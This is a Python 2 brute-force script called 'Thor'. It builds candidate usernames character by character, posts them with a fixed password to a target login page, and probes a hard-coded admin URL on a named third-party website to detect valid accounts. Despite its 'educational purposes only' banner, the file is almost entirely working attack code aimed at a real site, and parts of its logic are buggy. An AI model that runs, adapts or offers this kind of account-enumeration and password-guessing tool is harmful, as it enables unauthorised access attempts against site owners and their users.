#!/usr/bin/python
# -*- coding: utf-8 -*-
#======================================================
#THIS SCRIPT IS WRITTEN BY BOCIAN67 AND IS JUST FOR
#EDUCATIONAL PURPOSES ONLY!     ~Thor_will_win~
#======================================================
from requests import session
import os
#from pathlib import Path
import optparse
import sys
User = []
Pass = []
alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'                   #Alphabet
char_list = []



def add_remove(foo,length):
    f = open('words.txt','r+')                                       #and adding to file
    if foo not in f:
        f.write(foo+'\n')
        length+=1
    char_list.remove(foo)
    print foo + ' removed from temporary list'
    f.close()
    return length

def add_char(word):                                                 #generate words by
    z = 0                                                           #by adding new chars
    while (z <= len(alphabet)-1):
        brute = str(word) + str(alphabet[z])
        char_list.append(brute)
        print brute
        z += 1

def login(password,tarlog):
    f = open('words.txt', 'r+')
    for username in f:
        payload = {
            "action" : "login",
            "username" : username,
            "password" : password
        }
        with session() as c:
            c.post(tarlog, data=payload)
            response = c.get('http://www.paulheyde.net/admin/')
            content_length = response.headers["content-length"]
            status = response.status_code
            print("URL: "   +response.url+"\nUser: "+username+\
            "\n"+str(status))
            if str(status) != '404':#("Username nicht registriert" not in response.url):
                print "[+] Found Username: "+username
                return username
            else:
                print ("[-] Username is wrong!")
    f.close()
    f = open("words.txt", "w")
    f.close()
    f = open('words.txt', 'r+')


def main():
    first = False
    brute = ''
    length = 0
    parser = optparse.OptionParser('Thor for education: \n'\
    +'--TL <Target Login Page> --U <Username (optional)> --CreateUser')
    parser.add_option('--TL',dest='tarlog',type='string',\
    help='Target Login Page angeben')
    parser.add_option('--U',dest='usern',type='string',\
    help='Username angeben')
    parser.add_option('--CreateUser', dest='isCreatingUser',type='string',\
    help='Sollen Usernamen generiert werder?')

    (options, args) = parser.parse_args()
    tarlog = options.tarlog
    usern = options.usern
    isCreatingUser = options.isCreatingUser
    if (tarlog == None):
        print parser.usage
        exit(0)
    try:
        if isCreatingUser == "yes":
            count = raw_input("How many chars should the Username maximum include?\n")
            for y in range(0, int(count)):
                if (len(char_list) != 0) & (first == True):
                    for item in char_list:
                        if len(char_list) >= 50:
                            print 'erreicht'
                            length = add_remove(item, length)
                            print length
                            login("test1234", tarlog)
                            length=0
                            break
                        elif (len(item)<count):
                            add_char(item)
                        #elif(len(item)==count):

                else:
                    add_char(brute)
                    first = True
                    print 'HALLOHALLOHALLO'
            x = open('words.txt','w')
            x.close()
            sys.exit(0)
    except KeyboardInterrupt:
        f.close()
        exit(0)


if __name__ == '__main__':
    main()
